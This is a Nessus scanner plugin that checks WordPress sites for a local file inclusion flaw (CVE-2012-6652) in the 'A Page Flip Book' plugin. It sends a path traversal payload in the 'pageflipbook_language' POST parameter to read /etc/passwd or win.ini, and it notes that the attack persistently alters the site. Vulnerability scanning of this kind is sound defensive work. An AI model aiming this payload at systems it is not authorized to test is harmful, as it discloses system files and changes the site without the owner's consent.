#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62414);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_cve_id("CVE-2012-6652");
  script_bugtraq_id(54368);
  script_osvdb_id(83667);

  script_name(english:"WordPress A Page Flip Book Plugin for WordPress 'pageflipbook_language' Parameter Arbitrary Code Execution");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the 'A Page Flip Book' plugin for WordPress installed
on the remote host is affected by an arbitrary code execution
vulnerability due to a failure to properly sanitize user-supplied
input to the 'pageflipbook_language' parameter in the pageflipbook.php
script. An unauthenticated, remote attacker can exploit this issue to
view arbitrary files or execute arbitrary PHP code on the remote host.

Note that successful exploitation of this issue has resulted in a
persistent change to the site. To undo this change, reset the language
option for the plugin in the WordPress admin panel.");
  # http://ceriksen.com/2012/07/10/wordpress-a-page-flip-book-plugin-local-file-inclusion-vulnerability/"
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?82cd92a6");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:X/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress A Page Flip Book 2.3 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/10/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'A Page Flip Book';
# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('plugins\\.PageflipBook', 'Add your PageflipBook');
  checks["/wp-content/plugins/wppageflip/js/editor_plugin.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

url_path = install['Redirect'];
if (!isnull(url_path)) url = url_path;
else url = dir + "/";

foreach file (files)
{
  attack =  mult_str(str:"../", nb:12) + file;
  res = http_send_recv3(
    method    : "POST",
    item      : url,
    data      : "pageflipbook_language=" + urlencode(str:attack),
    content_type : "application/x-www-form-urlencoded",
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    pos = stridx(res[2], "<");
    out = substr(res[2], 0, pos - 1);
    count = 0;

    # Format our output for reporting. Limit to 15 lines
    foreach line (split(out))
    {
      output += line;
      count++;
      if (count >= 15) break;
    }

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      file        : file,
      request     : make_list(http_last_sent_request()),
      output      : output,
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
